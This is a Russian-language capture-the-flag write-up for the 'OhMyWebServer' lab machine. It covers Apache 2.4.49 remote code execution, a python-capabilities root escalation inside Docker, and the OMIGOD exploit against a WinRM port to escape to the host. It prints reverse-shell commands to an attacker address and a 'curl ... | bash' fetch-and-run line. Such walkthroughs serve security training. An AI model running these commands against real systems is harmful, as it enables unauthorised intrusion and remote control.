# OhMyWebServer WriteUp (Medium)✅

Перейдя по ip адресу мы попадаем на страницу какого-то сайта, связаного с консалтинговыми услугами

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Просканировав порты, мы модем узнать что на 80 порте находится **Apache-HTTP сервер**, при чем версия Apache - **2.4.49**

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Зайдя на сайт exploit-db.com и прогуглив данную версию ПО Apache, мы можем найти эксплойт, с помощью которого сможем удаленно выполнять код

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Скачиваем данный экспойт и тестируем его работу

<figure><img src="../.gitbook/assets/image (26) (1).png" alt=""><figcaption><p>Перед использованием скрипта я создал текстовый файл <strong>ip.txt</strong>, куда вписал ip адрес машины 📌</p></figcaption></figure>

Если мы можем с помощью данного эксплойта выполнять какие-либо команды, то, следовательно, вместо команды ls можно вписать [**bash\_reverse\_shell**](https://www.revshells.com/) и получить оболочку нашей машины

Подключив слушатель заранее, выполняем команду

`./50383.sh ip.txt /bin/sh 'bash -c "bash -i >& /dev/tcp/10.17.5.130/5555 0>&1"'`

и получаем шелл от лица пользователя **daemon**

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4) (4).png" alt=""><figcaption><p>Судя по странному набору букв и цифр после имени пользователя, мы находимся в докере 📌</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption><p>linpeas это подтвердил 📌</p></figcaption></figure>

Первый флаг, вероятнее всего, находится в папке root, но мы не имеем прав, чтобы в неё перейти, поэтому придётся выполнять эскалацию привилегий и получать **root**'a

C помощью linpeas'a мы узнаём, что можем проэксплуатировать [**python capabilities**](https://gtfobins.github.io/gtfobins/python/), с помощью команды `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` получаем **root**'a в докере&#x20;

<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Остаётся лишь вывести содержимое файла user.txt и получить первый флаг🚩

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Ничего, кроме внутреннего ip-адреса linpeas не нашёл, поэтому загружаем сканер nmap и сканируем порты (сканировать мы будем ip 172.12.0.1, т.к. 0.2 - это наш адрес, а предыдущий - хоста)

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Видим открытый 5986-й порт, который относится к **Windows Remote Management**

Данный сервис имеет уязвимость, которую мы можем проэксплуатировать с помощью **omigod**-экспойта

Загружаем его в папку /tmp

Перед эксплуатацией уязвимости создадим на собственной машине в папке /tmp файл shell.sh, где будет храниться bash\_rev\_shell(`bash -i >& dev/tcp/self_ip/6666 0>&1`)

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

В той же папке /tmp подключаем **python3**-сервер (port - **3333**)

Запускаем слушатель `nc -lvnp`` `**`6666`** на своей машине

На атакуемой машине в папке /tmp выполняем команду

&#x20;`python3 name_of_exploit -t 172.17.0.1 -c "curl self_ip:3333/`[`shell.sh`](https://vk.com/away.php?to=http%3A%2F%2Fshell.sh\&cc\_key=) `| bash"`

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Как итог, мы выбрались из докера и получили шелл основного сервера атакуемой машины, остаётся лишь вывести флаг **root.txt**

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
